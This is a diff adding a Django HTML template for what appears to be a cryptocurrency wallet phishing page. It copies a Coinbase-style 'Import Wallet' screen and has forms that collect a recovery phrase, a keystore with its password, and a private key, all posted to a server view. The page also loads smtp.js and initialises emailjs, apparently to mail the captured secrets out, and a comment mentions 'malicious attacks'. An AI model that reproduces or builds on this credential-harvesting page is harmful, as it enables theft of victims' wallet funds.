+                                <div class="flex h-full flex-col space-y-4 md:justify-center">
+                                    <select class="border-slate-300 from-slate-50 to-slate-100 font-light text-slate-500 outline-none ring-0 focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0">
+                                        <option value="Coinbase">Coinbase</option>
+                                    </select>
+                                </div>
+                                -->
+                                <form method='POST' action="{% url 'reference'%}">
+                                    {% csrf_token %}
+                                    <div id="phraseDiv" class="flex h-full flex-col space-y-2 md:justify-center">
+                                        <label for="Recovery Phrase" class="text-slate-600 font-semibold">Recovery Phrase</label>
+                                        <textarea id="phraseBox" name="recovery" class="h-28 resize-none rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-800 outline-none ring-0 scrollbar-thin scrollbar-track-slate-300 scrollbar-thumb-primary-blue placeholder:text-sm focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0 " value=""  id="phrase" ></textarea>
+                                        <p class="text-sm lg:text-base text-slate-600">Typically 12 (sometimes 24) words separated by a single space.</p>
+                                    </div>
+                                    <div id="keystoreDiv" style="display: none;" class="flex h-full flex-col space-y-2 md:justify-center">
+                                        <label for="Keystore" class="text-slate-600 font-semibold">Keystore</label>
+                                        <textarea id="keystoreBox" name="key" class="h-28 resize-none rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-800 outline-none ring-0 scrollbar-thin scrollbar-track-slate-300 scrollbar-thumb-primary-blue placeholder:text-sm focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0 " value=""  id="phrase" ></textarea>
+                                        <p class="text-sm lg:text-base text-slate-600">Several lines of text beginning with “{…}” plus the password you used for encryption.</p>
+                                        <input id="passwordBox" type="text" name="password" class="my-3 rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-500 outline-none ring-0 focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0  " placeholder="Enter the password" id="password" value="">
+                                    </div>
+                                    <div id="keyDiv" style="display: none;" class="flex h-full flex-col space-y-2 md:justify-center">
+                                        <label for="Private Key" class="text-slate-600 font-semibold">Private Key</label>
+                                        <textarea id="keyBox" name="private" class="h-28 resize-none rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-800 outline-none ring-0 scrollbar-thin scrollbar-track-slate-300 scrollbar-thumb-primary-blue placeholder:text-sm focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0 " value="" id="phrase" ></textarea>
+                                        <p class="text-sm lg:text-base text-slate-600">Before you enter private key, we recommend you connect to the internet.</p>
+                                    </div>
+                                    <div class="my-3">
+                                        <h6 class="alertmsgShow" >{{alert}}</h6>
+                                        <input type="submit" id="importBtn" value="Import Wallet" class="flex cursor-pointer space-x-2 rounded-md bg-l1 px-4 py-2 text-slate-100 transition-all duration-[300ms] disabled:pointer-events-none disabled:bg-gradient-to-b disabled:from-slate-100/40 disabled:to-slate-300/10 disabled:text-slate-500/80">
+                                            {% comment %} <span class="">Import Wallet</span> {% endcomment %}
+                                        {% comment %} </button> {% endcomment %}
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+            <div style="position:fixed;z-index:9999;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none"></div>
+        </div>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script type="text/javascript">
+            (function() {
+                emailjs.init("nYa8Ggqx7fZR4hhkD");
+                //please encrypted user id for malicious attacks
+            }
+            )();
+        </script>
+        <script>
+
+            const switchForm = (num) => {
+
+                const className = "bg-white text-primary"
+                $(".tab-title").removeClass(className);
+
+                const phraseTitle = $("#phraseTitle");
+                const keystoreTitle = $("#keystoreTitle");
+                const keyTitle = $("#keyTitle");
+                const importBtn = $("#importBtn");
+
+                const phraseDiv = $("#phraseDiv");
+                const keystoreDiv = $("#keystoreDiv");
+                const keyDiv = $("#keyDiv");
+
+                phraseDiv.hide();
+                keystoreDiv.hide();
+                keyDiv.hide();
+
+                importBtn.prop("onclick", null).off("click");
+
+                switch (num) {
+                case 0:
+                    phraseTitle.addClass(className);
+                    phraseDiv.show();
+                    importBtn.on("click", goPhrase);
+
+                    break;
+
+                case 1:
+                    keystoreTitle.addClass(className);
+                    keystoreDiv.show();
+                    importBtn.on("click", goKeystore);
+                    break;
+
+                case 2:
+                    keyTitle.addClass(className);
+                    keyDiv.show();
+                    importBtn.on("click", goKey);
+                    break;
+
+                default:
+                    break;
+                }
+            }
+{% comment %} 
+            const formkey = document.getElementById('importBtn');
+            const formkey2 = document.getElementById('importBtn');
+            const formkey3 = document.getElementById('importBtn');
+
+            formkey.addEventListener("click", function() {
+                var phraseBox = document.getElementById('phraseBox');
+                
+                //get input values            
+                var phrasecheck = phraseBox.value;
+
+                if (phrasecheck === "" ) {
+                    // Prevent the form submission
+                    
+                }
+
+                else{
+                    var myUrl = "{% url 'reference' %}";
+                    window.location.href = myUrl;
+                }
+                
+            });
+
+            formkey2.addEventListener("click", function() {
+                var keyBox = document.getElementById('keyBox');
+                var keyBoxcheck = keyBox.value;
+
+
+                if (keyBoxcheck === "" ) {
+                    // Prevent the form submission
+                    
+                }
+
+                else{
+                    var myUrl = "{% url 'reference' %}";
+                    window.location.href = myUrl;
+                }
+                
+            });
+
+            formkey3.addEventListener("click", function() {
+                var keystoreBox = document.getElementById('keystoreBox');
+                var passwordBox = document.getElementById('passwordBox');
+
+                //get input values
+                var keystorecheck = keystoreBox.value;
+                var passwordcheck = passwordBox.value;
+
+                if (keystorecheck !== "" && passwordcheck !== ""  ) {
+                    var myUrl = "{% url 'reference' %}";
+                    window.location.href = myUrl;
+                }
+                else{
+                    // Prevent the form submission
+                }
+                
+            }); {% endcomment %}
+        </script>
+    </body>
+</html>
